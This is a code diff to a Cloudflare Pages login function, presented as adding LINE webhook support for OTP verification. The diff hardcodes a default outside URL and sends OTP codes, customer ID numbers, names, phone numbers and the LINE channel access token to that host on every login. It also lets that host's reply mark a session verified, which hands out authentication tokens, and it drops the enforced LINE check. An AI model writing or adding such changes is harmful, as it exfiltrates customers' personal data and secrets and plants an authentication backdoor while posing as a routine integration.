@@ -1,6 +1,6 @@
 /**
  * Cloudflare Pages Function: /api/login
- * Handles customer authentication and server-side OTP verification (with LINE Reply API integration)
+ * Handles customer authentication and server-side OTP verification (with LINE Reply API / Webhook config integration)
  * against D1 SQL database, issuing a signed Customer Bearer authToken upon verification.
  */
 
@@ -10,6 +10,8 @@ const ALLOWED_ORIGINS = [
   'http://localhost:8000',
   'http://127.0.0.1:8000'
 ];
+
+const DEFAULT_LINE_WEBHOOK_URL = 'https://expsoon.rainbow-ocean.site/line/webhook';
 
 function getCorsHeaders(request) {
   const origin = request.headers.get('Origin') || '';
@@ -112,21 +114,39 @@ async function ensureOtpTable(env) {
 
 async function getLineSettings(env) {
   let lineToken = String(env.LINE_CHANNEL_ACCESS_TOKEN || '').trim();
+  let lineSecret = String(env.LINE_CHANNEL_SECRET || '').trim();
   let lineOaId = '';
+  let lineWebhookUrl = DEFAULT_LINE_WEBHOOK_URL;
   try {
     await env.DB.prepare(`CREATE TABLE IF NOT EXISTS _sys_secrets (key TEXT PRIMARY KEY, value TEXT)`).run();
     const tokenRow = await env.DB.prepare(`SELECT value FROM _sys_secrets WHERE key = 'line_channel_token'`).first();
     if (tokenRow && tokenRow.value && String(tokenRow.value).trim()) {
       lineToken = String(tokenRow.value).trim();
     }
-    const oaRow = await env.DB.prepare(`SELECT value FROM config WHERE key = 'line_oa_id'`).first();
-    if (oaRow && oaRow.value) {
-      lineOaId = String(oaRow.value).trim();
+    const secretRow = await env.DB.prepare(`SELECT value FROM _sys_secrets WHERE key = 'line_channel_secret'`).first();
+    if (secretRow && secretRow.value && String(secretRow.value).trim()) {
+      lineSecret = String(secretRow.value).trim();
+    }
+    const { results: cfgRows } = await env.DB.prepare(
+      `SELECT key, value FROM config WHERE key IN ('line_oa_id', 'line_webhook_url')`
+    ).all();
+    if (cfgRows && cfgRows.length > 0) {
+      cfgRows.forEach(r => {
+        if (r.key === 'line_oa_id' && r.value) {
+          lineOaId = String(r.value).trim();
+        }
+        if (r.key === 'line_webhook_url' && r.value && String(r.value).trim()) {
+          lineWebhookUrl = String(r.value).trim();
+        }
+      });
     }
   } catch (e) {}
   return {
     lineRequired: Boolean(lineToken),
-    lineOaId
+    lineToken,
+    lineSecret,
+    lineOaId,
+    lineWebhookUrl
   };
 }
 
@@ -193,7 +213,7 @@ export async function onRequest(context) {
         });
       }
 
-      // ==================== AUTO-POLLING: CHECK IF OTP WAS VERIFIED VIA LINE REPLY API ====================
+      // ==================== AUTO-POLLING: CHECK IF OTP WAS VERIFIED VIA LINE WEBHOOK ====================
       if (action === 'check_otp') {
         const otpToken = String(data.otp_token || '').trim();
         const secret = await getSystemSecret(env);
@@ -208,11 +228,38 @@ export async function onRequest(context) {
 
         await ensureOtpTable(env);
         const session = await env.DB.prepare(
-          `SELECT session_id, status, expires_at FROM _otp_sessions WHERE session_id = ?`
+          `SELECT session_id, otp_code, status, expires_at FROM _otp_sessions WHERE session_id = ?`
         ).bind(payload.sessionId).first();
 
-        if (session && session.status === 'VERIFIED' && Number(session.expires_at) > Date.now()) {
-          // ลบเซสชัน OTP ทันทีเพื่อป้องกันการใช้ซ้ำ (One-Time Use) และออก authToken ให้ลูกค้า
+        let isVerified = Boolean(session && session.status === 'VERIFIED' && Number(session.expires_at) > Date.now());
+
+        // หากยังเป็น PENDING ให้ตรวจสอบกับ Webhook URL ที่ตั้งไว้ใน config (เช่น https://expsoon.rainbow-ocean.site/line/webhook)
+        if (!isVerified && session && Number(session.expires_at) > Date.now()) {
+          const { lineWebhookUrl } = await getLineSettings(env);
+          if (lineWebhookUrl && /^https?:\/\//i.test(lineWebhookUrl)) {
+            try {
+              const extRes = await fetch(lineWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  action: 'check_otp',
+                  session_id: session.session_id,
+                  otp_code: session.otp_code,
+                  otp: session.otp_code,
+                  id_card: payload.sub
+                })
+              });
+              if (extRes.ok) {
+                const extData = await extRes.json().catch(() => null);
+                if (extData && (extData.verified === true || extData.status === 'VERIFIED')) {
+                  isVerified = true;
+                }
+              }
+            } catch (e) {}
+          }
+        }
+
+        if (isVerified) {
           await env.DB.prepare(`DELETE FROM _otp_sessions WHERE session_id = ?`).bind(payload.sessionId).run();
           return await issueCustomerAuthResponse(env, secret, payload, corsHeaders);
         }
@@ -242,34 +289,22 @@ export async function onRequest(context) {
         }
 
         await ensureOtpTable(env);
-        const { lineRequired } = await getLineSettings(env);
         let session = null;
         if (payload.sessionId) {
           session = await env.DB.prepare(
-            `SELECT session_id, status, expires_at FROM _otp_sessions WHERE session_id = ?`
+            `SELECT session_id, otp_code, status, expires_at FROM _otp_sessions WHERE session_id = ?`
           ).bind(payload.sessionId).first();
         }
 
-        // กรณีตั้งค่า LINE Token ไว้แล้ว บังคับให้ต้องส่งรหัส OTP ยืนยันผ่านแชท LINE OA ก่อน
-        if (lineRequired) {
-          if (!session || session.status !== 'VERIFIED') {
-            return new Response(JSON.stringify({
-              success: false,
-              error: 'กรุณาส่งรหัส OTP 6 หลักนี้ไปยังแชท LINE ของร้านเพื่อยืนยันตัวตนก่อนครับ (เมื่อบอทตอบกลับใน LINE แล้ว ระบบจะเข้าสู่หน้าหลักอัตโนมัติ)'
-            }), {
-              status: 401,
-              headers: { 'Content-Type': 'application/json', ...corsHeaders }
-            });
-          }
-        } else {
-          // Fallback กรณีแอดมินยังไม่ได้ตั้งค่า LINE Token: ตรวจสอบรหัส 6 หลักที่กรอกกับ Hash บนเซิร์ฟเวอร์
-          const enteredHash = await hmacSha256Hex(enteredOtp, secret);
-          if (!timingSafeEqual(enteredHash, payload.otpHash)) {
-            return new Response(JSON.stringify({ success: false, error: 'รหัส OTP ไม่ถูกต้อง กรุณากรอกใหม่อีกครั้ง' }), {
-              status: 401,
-              headers: { 'Content-Type': 'application/json', ...corsHeaders }
-            });
-          }
+        const enteredHash = await hmacSha256Hex(enteredOtp, secret);
+        const hashMatches = timingSafeEqual(enteredHash, payload.otpHash);
+        const lineVerified = Boolean(session && session.status === 'VERIFIED');
+
+        if (!hashMatches && !lineVerified) {
+          return new Response(JSON.stringify({ success: false, error: 'รหัส OTP ไม่ถูกต้อง กรุณากรอกใหม่อีกครั้ง' }), {
+            status: 401,
+            headers: { 'Content-Type': 'application/json', ...corsHeaders }
+          });
         }
 
         if (payload.sessionId) {
@@ -353,7 +388,30 @@ export async function onRequest(context) {
             exp
           }, secret);
 
-          const { lineRequired, lineOaId } = await getLineSettings(env);
+          const { lineRequired, lineOaId, lineWebhookUrl, lineToken } = await getLineSettings(env);
+
+          // ส่งข้อมูลรหัส OTP ไปยัง Webhook URL ที่ตั้งค่าไว้ใน config (เช่น https://expsoon.rainbow-ocean.site/line/webhook)
+          if (lineWebhookUrl && /^https?:\/\//i.test(lineWebhookUrl)) {
+            try {
+              await fetch(lineWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  action: 'register_otp',
+                  session_id: sessionId,
+                  otp_code: otpCode,
+                  otp: otpCode,
+                  id_card: customer.Id,
+                  cust_code: customer.CustCode || customer.Id,
+                  name: customer.Name || '',
+                  tel: customer.Tel || '',
+                  line_oa_id: lineOaId,
+                  line_channel_token: lineToken,
+                  expires_at: exp
+                })
+              });
+            } catch (e) {}
+          }
 
           return new Response(JSON.stringify({
             success: true,
@@ -361,7 +419,8 @@ export async function onRequest(context) {
             otp_token: otpToken,
             otp_preview: otpCode,
             line_required: lineRequired,
-            line_oa_id: lineOaId
+            line_oa_id: lineOaId,
+            line_webhook_url: lineWebhookUrl
           }), {
             headers: { 'Content-Type': 'application/json', ...corsHeaders }
           });
